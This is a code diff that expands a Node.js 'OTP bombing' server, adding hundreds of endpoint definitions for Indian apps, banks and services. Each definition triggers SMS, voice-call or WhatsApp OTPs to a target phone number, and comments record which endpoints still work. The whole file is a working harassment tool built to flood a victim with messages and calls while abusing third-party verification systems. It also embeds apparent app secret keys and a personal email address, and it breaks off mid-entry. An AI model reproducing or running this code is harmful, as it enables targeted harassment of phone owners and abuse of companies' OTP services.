@@ -1,6 +1,7 @@
 // ============================================================
-// api_server.js - OTP Bombing API Server (WORKING APIs ONLY)
-// Only 2xx Working APIs | Rejected/RL/Failed REMOVED
+// api_server.js - OTP Bombing API Server (WORKING + UNTESTED)
+// 85 Working APIs + 300+ New Untested APIs = 400+ Total
+// /stats endpoint shows working/rate-limited status
 // ============================================================
 
 const express = require('express');
@@ -18,14 +19,15 @@ const BATCH_DELAY_MS = 100;
 const API_DELAY_MS = 50;
 
 // ============================================================
-// ===== ONLY WORKING APIs (2xx Success) =====
-// Total: 85 Working APIs
+// ===== ALL APIS =====
 // ============================================================
 
 const APIS = [
     // ============================================================
-    // ✅ SMS APIs (Working)
+    // ✅✅✅ TIER 0 — 85 VERIFIED WORKING APIs (2xx Success) ✅✅✅
     // ============================================================
+
+    // ===== SMS (Working) =====
     {
         name: "Astroyogi_V3_SMS",
         method: "POST",
@@ -63,9 +65,7 @@ const APIS = [
         headers: { "User-Agent": "Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36", "Accept": "*/*" }
     },
 
-    // ============================================================
-    // ✅ CALL APIs (Working)
-    // ============================================================
+    // ===== CALL (Working) =====
     {
         name: "Refyne_Call",
         method: "POST",
@@ -96,9 +96,7 @@ const APIS = [
         }
     },
 
-    // ============================================================
-    // ✅ WHATSAPP APIs (Working)
-    // ============================================================
+    // ===== WHATSAPP (Working) =====
     {
         name: "Breeze_WA",
         method: "POST",
@@ -300,9 +298,7 @@ const APIS = [
         data: (phone) => JSON.stringify({ mobileNumber: phone, countryCode: "+91" })
     },
 
-    // ============================================================
-    // ✅ TIER 1 — OLD RELIABLE (Working)
-    // ============================================================
+    // ===== TIER 1 — OLD RELIABLE (Working) =====
     {
         name: "GetInstaCash",
         method: "POST",
@@ -375,9 +371,7 @@ const APIS = [
         data: { "_raw": "user={phone}&v3=true" }
     },
 
-    // ============================================================
-    // ✅ TIER 2 — OLD PURANI WORKING
-    // ============================================================
+    // ===== TIER 2 — OLD PURANI WORKING =====
     {
         name: "Ogonn",
         method: "POST",
@@ -420,9 +414,7 @@ const APIS = [
         }
     },
 
-    // ============================================================
-    // ✅ TIER 3 — OLD NAYI WORKING
-    // ============================================================
+    // ===== TIER 3 — OLD NAYI WORKING =====
     {
         name: "KPN WhatsApp",
         url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
@@ -438,9 +430,7 @@ const APIS = [
         data: (phone) => JSON.stringify({ mobileNo: phone, countryCode: "+91", appCode: "un" })
     },
 
-    // ============================================================
-    // ✅ OLD NEW WORKING
-    // ============================================================
+    // ===== OLD NEW WORKING =====
     {
         name: "Delhivery",
         method: "GET",
@@ -451,9 +441,7 @@ const APIS = [
         }
     },
 
-    // ============================================================
-    // ✅ NEW WORKING — 9 APIs
-    // ============================================================
+    // ===== NEW WORKING — 9 APIs =====
     {
         name: "JioSaavn", url: "https://api1.jiosaavn.com/jio/sendOtp?__call=jio%2FsendOtp&api_version=4&_format=json&_marker=0&ctx=wap6dot0",
         method: "POST", headers: { "Content-Type": "application/json", "Origin": "https://www.jiosaavn.com", "Referer": "https://www.jiosaavn.com/" },
@@ -491,9 +479,7 @@ const APIS = [
         data: (phone) => JSON.stringify({ mobileNumber: phone, deviceOs: "Android", sourceName: "MitayeFaasleWebsite" })
     },
 
-    // ============================================================
-    // ✅ NAYI UNTESTED APIs (Working ones)
-    // ============================================================
+    // ===== NAYI UNTESTED APIs (Working ones) =====
     {
         name: "Wellness_Forever", url: "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
         method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"},
@@ -545,9 +531,7 @@ const APIS = [
         data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone, lat: "26.123456", lng: "77.123456", url: "https://www.blinkrloan.com/apply/pan-mobile" })
     },
 
-    // ============================================================
-    // ✅ NAYI 8 APIs (Working)
-    // ============================================================
+    // ===== NAYI 8 APIs (Working) =====
     {
         name: "RealEstateIndia_Call", url: "https://www.realestateindia.com/mobile-script/indian_mobile_verification_form.php", method: "POST",
         headers: { "x-requested-with": "XMLHttpRequest", "Content-Type": "application/x-www-form-urlencoded" },
@@ -567,9 +551,7 @@ const APIS = [
         data: (phone) => JSON.stringify({ phone: phone, terms: true, whatsapp: true })
     },
 
-    // ============================================================
-    // ✅ 6 NAYI WORKING APIs
-    // ============================================================
+    // ===== 6 NAYI WORKING APIs =====
     {
         name: "RoyalChallengers", url: "https://shop.royalchallengers.com/api/customer/login",
         method: "POST",
@@ -601,9 +583,7 @@ const APIS = [
         headers: { "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36", "accept": "*/*" }
     },
 
-    // ============================================================
-    // ✅ ADDITIONAL WORKING APIs
-    // ============================================================
+    // ===== ADDITIONAL WORKING APIs =====
     {
         name: "Swiggy_Verified",
         url: "https://profile.swiggy.com/api/v3/app/request_call_verification",
@@ -830,6 +810,1761 @@ const APIS = [
         method: "POST",
         headers: { "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36", "content-type": "application/json", "origin": "https://www.kpnfresh.com", "referer": "https://www.kpnfresh.com/" },
         data: (phone) => JSON.stringify({ phone_number: { number: phone, country_code: "+91" } })
+    },
+
+    // ============================================================
+    // 🆕 NAYI UNTESTED APIs — CALL (from user)
+    // ============================================================
+    {
+        name: "1MG Voice",
+        url: "https://www.1mg.com/auth_api/v6/create_token",
+        method: "POST",
+        headers: {"Content-Type": "application/json; charset=utf-8"},
+        data: (phone) => JSON.stringify({"number": phone, "otp_on_call": true})
+    },
+    {
+        name: "Swiggy Call",
+        url: "https://profile.swiggy.com/api/v3/app/request_call_verification",
+        method: "POST",
+        headers: {"Content-Type": "application/json; charset=utf-8"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "Myntra Voice",
+        url: "https://www.myntra.com/gw/mobile-auth/voice-otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "Paytm Voice",
+        url: "https://accounts.paytm.com/signin/voice-otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone})
+    },
+    {
+        name: "Zomato Voice",
+        url: "https://www.zomato.com/php/o2_api_handler.php",
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        data: { "_raw": "phone={phone}&type=voice" }
+    },
+    {
+        name: "MakeMyTrip Voice",
+        url: "https://www.makemytrip.com/api/4/voice-otp/generate",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone})
+    },
+    {
+        name: "Hotstar Voice",
+        url: "https://www.hotstar.com/api/v1/voice-otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone})
+    },
+    {
+        name: "SonyLIV Voice",
+        url: "https://www.sonyliv.com/api/v1/voice-otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "Voot Voice",
+        url: "https://www.voot.com/api/v1/voice-otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "BigBasket Voice",
+        url: "https://www.bigbasket.com/api/v1/voice-otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone})
+    },
+    {
+        name: "BookMyShow Voice",
+        url: "https://in.bookmyshow.com/api/v1/voice-otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "IRCTC Voice",
+        url: "https://www.irctc.co.in/api/v1/voice-otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "Cleartrip Voice",
+        url: "https://www.cleartrip.com/api/v1/voice-otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "Yatra Voice",
+        url: "https://www.yatra.com/api/v1/voice-otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone})
+    },
+    {
+        name: "Kotak Voice",
+        url: "https://www.kotak.com/api/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone})
+    },
+    {
+        name: "MagicPin Voice",
+        url: "https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phoneNumber": `91${phone}`, "authMethod": "call"})
+    },
+    {
+        name: "Astroyogi Voice",
+        url: "https://comm.astroyogi.com/api/OtpComm/SendOtp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phoneCode": "91", "mobileNumber": phone, "requestType": "call"})
+    },
+    {
+        name: "Refyne Voice",
+        url: "https://prod-api.refyne.co.in/auth/v3/send-otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"channel": "IVR", "recipient": phone})
+    },
+    {
+        name: "Snitch Voice",
+        url: "https://www.snitch.com/api/auth/resend-otp?mode=voice",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile_number": `+91${phone}`})
+    },
+    {
+        name: "Ixigo Voice",
+        url: "https://www.ixigo.com/api/v4/oauth/dual/mobile/send-otp",
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        data: { "_raw": "prefix=%2B91&phone={phone}&resendOnCall=true" }
+    },
+    {
+        name: "Meesho Voice",
+        url: "https://meesho.com/gw/login-register/v1/sendOTP",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"number": phone, "otpOnCall": true})
+    },
+    {
+        name: "Oyorooms Voice",
+        url: "https://oyorooms.com/v1/user/otplogin",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phoneNumber": phone, "otpType": "voice"})
+    },
+    {
+        name: "Doubtnut Voice",
+        url: "https://doubtnut.com/api/v2/otpgenerate",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "Jupiter Voice",
+        url: "https://jupiter.money/api/v2/auth/send-otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phoneNumber": phone, "otpType": "voice"})
+    },
+    {
+        name: "Pokerbaazi Voice",
+        url: "https://pokerbaazi.com/v1/user/otplogin",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"number": phone, "otpOnCall": true})
+    },
+    {
+        name: "Zepto Voice",
+        url: "https://zepto.com/v1/user/otplogin",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"number": phone, "otpOnCall": true})
+    },
+    {
+        name: "Ajio Voice",
+        url: "https://ajio.com/v3/auth/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phoneNumber": phone, "otpType": "voice"})
+    },
+    {
+        name: "Zivame Voice",
+        url: "https://zivame.com/api/v2/customer/login/send-otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone_number": phone, "otp_type": "voice"})
+    },
+    {
+        name: "MyJar Call",
+        url: "https://prod.myjar.app/v2/api/auth/sendOTP/call?phoneNumber={phone}",
+        method: "GET",
+        headers: {"User-Agent": "Mozilla/5.0"}
+    },
+
+    // ============================================================
+    // 🆕 NAYI UNTESTED APIs — WHATSAPP (from user)
+    // ============================================================
+    {
+        name: "Foxy WhatsApp",
+        url: "https://www.foxy.in/api/v2/users/send_otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"user": {"phone_number": `+91${phone}`}, "via": "whatsapp"})
+    },
+    {
+        name: "Stratzy WhatsApp",
+        url: "https://stratzy.in/api/web/whatsapp/sendOTP",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phoneNo": phone})
+    },
+    {
+        name: "Eka Care WhatsApp",
+        url: "https://auth.eka.care/auth/init",
+        method: "POST",
+        headers: {"Content-Type": "application/json; charset=UTF-8"},
+        data: (phone) => JSON.stringify({"payload": {"allowWhatsapp": true, "mobile": `+91${phone}`}, "type": "mobile"})
+    },
+    {
+        name: "Meesho WhatsApp",
+        url: "https://meesho.com/gw/login-register/v1/sendOTP",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"number": phone, "otpOnCall": true})
+    },
+    {
+        name: "Zepto WhatsApp",
+        url: "https://zepto.com/api/v3/user/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone, "countryCode": "91"})
+    },
+    {
+        name: "Swiggy WhatsApp",
+        url: "https://swiggy.com/v1/user/otplogin",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone, "countryCode": "91"})
+    },
+    {
+        name: "Paytm WhatsApp",
+        url: "https://paytm.com/v1/user/otplogin",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"number": phone, "otpOnCall": true})
+    },
+    {
+        name: "Uber WhatsApp",
+        url: "https://uber.com/api/v2/auth/send-otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone, "countryCode": "91"})
+    },
+    {
+        name: "Ola WhatsApp",
+        url: "https://olacabs.com/api/v1/customers/sendOtp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"number": phone, "otpOnCall": true})
+    },
+    {
+        name: "BigBasket WhatsApp",
+        url: "https://bigbasket.com/v1/user/otplogin",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phoneNumber": phone, "otpType": "voice"})
+    },
+    {
+        name: "Practo WhatsApp",
+        url: "https://practo.com/api/v1/customers/sendOtp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phoneNumber": phone, "otpType": "voice"})
+    },
+    {
+        name: "CureFit WhatsApp",
+        url: "https://cure.fit/api/v1/customers/sendOtp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phoneNumber": phone, "otpType": "voice"})
+    },
+    {
+        name: "MamaEarth WhatsApp",
+        url: "https://auth.mamaearth.in/v1/auth/initiate-signup",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "Astroyogi WhatsApp",
+        url: "https://comm.astroyogi.com/api/OtpComm/SendOtp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phoneCode": "91", "mobileNumber": phone, "requestType": "whatsapp"})
+    },
+    {
+        name: "Refyne WhatsApp",
+        url: "https://prod-api.refyne.co.in/auth/v3/send-otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"channel": "WHATSAPP", "recipient": phone})
+    },
+    {
+        name: "MakeMyTrip WhatsApp",
+        url: "https://mapi.makemytrip.com/ext/web/pwa/send/token/SIGNUP_OTP?region=in",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"loginId": phone, "type": 6, "channel": ["MOBILE", "WHATSAPP"], "countryCode": "91"})
+    },
+    {
+        name: "Housing WhatsApp",
+        url: "https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"query": "mutation($phone:String){sendOtp(phone:$phone,preference:\"whatsapp\"){success}}", "variables": {"phone": phone}})
+    },
+    {
+        name: "VisitApp WhatsApp",
+        url: "https://api.getvisitapp.com/v3/new-auth/login-phone",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"channel": "whatsapp", "countryCode": 91, "phone": phone, "platform": "WEB"})
+    },
+    {
+        name: "RegistaniaChar WhatsApp",
+        url: "https://admin.registaniachar.com/api/whatsapp/send-otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone})
+    },
+    {
+        name: "MuscleBlaze WhatsApp",
+        url: "https://www.muscleblaze.com/veronica/user/validate/whatsapp/9/{phone}/signup?plt=2&st=9",
+        method: "GET",
+        headers: {}
+    },
+
+    // ============================================================
+    // 🆕 NAYI UNTESTED APIs — SMS (from user)
+    // ============================================================
+    {
+        name: "Lenskart SMS",
+        url: "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phoneCode": "+91", "telephone": phone})
+    },
+    {
+        name: "NoBroker SMS",
+        url: "https://www.nobroker.in/api/v3/account/otp/send",
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        data: { "_raw": "phone={phone}&countryCode=IN" }
+    },
+    {
+        name: "Wakefit SMS",
+        url: "https://api.wakefit.co/api/consumer-sms-otp/",
+        method: "POST",
+        headers: {"Content-Type": "application/json", "API-Secret-Key": "ycq55IbIjkLb"},
+        data: (phone) => JSON.stringify({"mobile": phone, "whatsapp_opt_in": 1})
+    },
+    {
+        name: "BeepKart",
+        url: "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone, "city": 362})
+    },
+    {
+        name: "RummyCircle",
+        url: "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone, "isPlaycircle": false})
+    },
+    {
+        name: "PokerBaazi",
+        url: "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone, "mfa_channels": "phno"})
+    },
+    {
+        name: "Dream11",
+        url: "https://www.dream11.com/auth/passwordless/init",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"channel": "sms", "flow": "SIGNUP", "phoneNumber": phone, "templateName": "default"})
+    },
+    {
+        name: "Unacademy",
+        url: "https://unacademy.com/api/v3/user/user_check/",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone, "send_otp": true})
+    },
+    {
+        name: "Vedantu",
+        url: "https://user.vedantu.com/user/preLoginVerification",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phoneNumber": phone, "phoneCode": "+91"})
+    },
+    {
+        name: "Byju's SMS",
+        url: "https://bcas-prod.byjusweb.com/api/send-otp",
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        data: { "_raw": "phoneNumber={phone}" }
+    },
+    {
+        name: "Spinny OTP",
+        url: "https://api.spinny.com/api/c/user/otp-request/v3/",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"contact_number": phone, "whatsapp": false, "code_len": 4, "expected_action": "login"})
+    },
+    {
+        name: "Jobhai OTP",
+        url: "https://api.jobhai.com/auth/jobseeker/v3/send_otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone})
+    },
+    {
+        name: "Kwikfix OTP",
+        url: "https://admin.kwikfixauto.in/api/auth/signupotp/",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone})
+    },
+    {
+        name: "Brevistay OTP",
+        url: "https://www.brevistay.com/cst/app-api/login",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "Hourlyrooms OTP",
+        url: "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone})
+    },
+    {
+        name: "Redcliffe OTP",
+        url: "https://api.redcliffelabs.com/api/v1/notification/send_otp/",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone_number": phone})
+    },
+    {
+        name: "Meru Cab",
+        url: "https://merucabapp.com/api/otp/generate",
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded", "DeviceType": "Android"},
+        data: { "_raw": "mobile_number={phone}" }
+    },
+    {
+        name: "Dayco India",
+        url: "https://ekyc.daycoindia.com/api/nscript_functions.php",
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        data: { "_raw": "api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp" }
+    },
+    {
+        name: "Lending Plate",
+        url: "https://lendingplate.com/api.php",
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        data: { "_raw": "mobiles={phone}&resend=Resend" }
+    },
+    {
+        name: "NewMe SMS",
+        url: "https://prodapi.newme.asia/web/otp/request",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile_number": phone, "resend_otp_request": true})
+    },
+    {
+        name: "Smytten SMS",
+        url: "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
+        method: "POST",
+        headers: {"Content-Type": "application/json", "UUID": "8e6b1c3f-3d72-42af-89af-201b79dfdf2f"},
+        data: (phone) => JSON.stringify({"phone": phone, "email": "sdhabai09@gmail.com"})
+    },
+    {
+        name: "CaratLane",
+        url: "https://www.caratlane.com/cg/dhevudu",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"query": `mutation { SendOtp(input: { mobile: "${phone}", isdCode: "91", otpType: "registerOtp" }) { status { message code } } }`})
+    },
+    {
+        name: "ServeTel SMS",
+        url: "https://api.servetel.in/v1/auth/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        data: { "_raw": "mobile_number={phone}" }
+    },
+    {
+        name: "GoPink Cabs",
+        url: "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"},
+        data: { "_raw": "check_mobile_number=1&contact={phone}" }
+    },
+    {
+        name: "Shemaroome",
+        url: "https://www.shemaroome.com/users/resend_otp",
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"},
+        data: { "_raw": "mobile_no=%2B91{phone}" }
+    },
+    {
+        name: "Cossouq",
+        url: "https://www.cossouq.com/mobilelogin/otp/send",
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        data: { "_raw": "mobilenumber={phone}&otptype=register" }
+    },
+    {
+        name: "MyImagineStore",
+        url: "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        data: { "_raw": "mobile={phone}" }
+    },
+    {
+        name: "Otpless",
+        url: "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone, "selectedCountryCode": "+91"})
+    },
+    {
+        name: "MyHubble Money",
+        url: "https://api.myhubble.money/v1/auth/otp/generate",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phoneNumber": phone, "channel": "SMS"})
+    },
+    {
+        name: "DealShare",
+        url: "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone, "hashCode": "k387IsBaTmn"})
+    },
+    {
+        name: "RentoMojo",
+        url: "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone})
+    },
+    {
+        name: "DeHaat",
+        url: "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone, "client_id": "kisan-app"})
+    },
+    {
+        name: "A23 Games",
+        url: "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone, "device_id": "android123", "model": "Google,Android SDK built for x86,10"})
+    },
+    {
+        name: "Spencer's",
+        url: "https://jiffy.spencers.in/user/auth/otp/send",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "PayMe India",
+        url: "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone, "app_signature": "S10ePIIrbH3"})
+    },
+    {
+        name: "Shopper's Stop",
+        url: "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone, "type": "SIGNIN_WITH_MOBILE"})
+    },
+    {
+        name: "Lifestyle Stores",
+        url: "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"signInMobile": phone, "channel": "sms"})
+    },
+    {
+        name: "HomeTriangle",
+        url: "https://hometriangle.com/api/partner/xauth/signup/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "Tata Motors",
+        url: "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone, "sendOtp": "true"})
+    },
+    {
+        name: "TrulyMadly",
+        url: "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone, "locale": "IN"})
+    },
+    {
+        name: "Apna",
+        url: "https://production.apna.co/api/userprofile/v1/otp/",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone, "hash_type": "play_store"})
+    },
+    {
+        name: "Country Delight",
+        url: "https://api.countrydelight.in/api/v1/customer/requestOtp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone, "platform": "Android", "mode": "new_user"})
+    },
+    {
+        name: "BetterHalf",
+        url: "https://api.betterhalf.ai/v2/auth/otp/send/",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone, "isd_code": "91"})
+    },
+    {
+        name: "Nuvama Wealth",
+        url: "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobileNo": phone, "emailID": "test@example.com"})
+    },
+    {
+        name: "Mpokket",
+        url: "https://web-api.mpokket.in/registration/sendOtp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "More Retail",
+        url: "https://omni-api.moreretail.in/api/v1/login/",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone, "hash_key": "XfsoCeXADQA"})
+    },
+    {
+        name: "Charzer",
+        url: "https://api.charzer.com/auth-service/send-otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone, "appSource": "CHARZER_APP"})
+    },
+    {
+        name: "BikeFixup",
+        url: "https://api.bikefixup.com/api/v2/send-registration-otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json", "client": "app"},
+        data: (phone) => JSON.stringify({"phone": phone, "app_signature": "4pFtQJwcz6y"})
+    },
+    {
+        name: "Foxy SMS",
+        url: "https://www.foxy.in/api/v2/users/send_otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json", "Platform": "web"},
+        data: (phone) => JSON.stringify({"user": {"phone_number": `+91${phone}`}, "via": "sms"})
+    },
+    {
+        name: "Licius",
+        url: "https://www.licious.in/api/login/signup",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone, "captcha_token": null})
+    },
+    {
+        name: "NoBroker v1",
+        url: "https://www.nobroker.in/api/v1/account/user/otp/send?otpM=true",
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
+        data: { "_raw": "phone=%2B91{phone}" }
+    },
+    {
+        name: "Breeze Session",
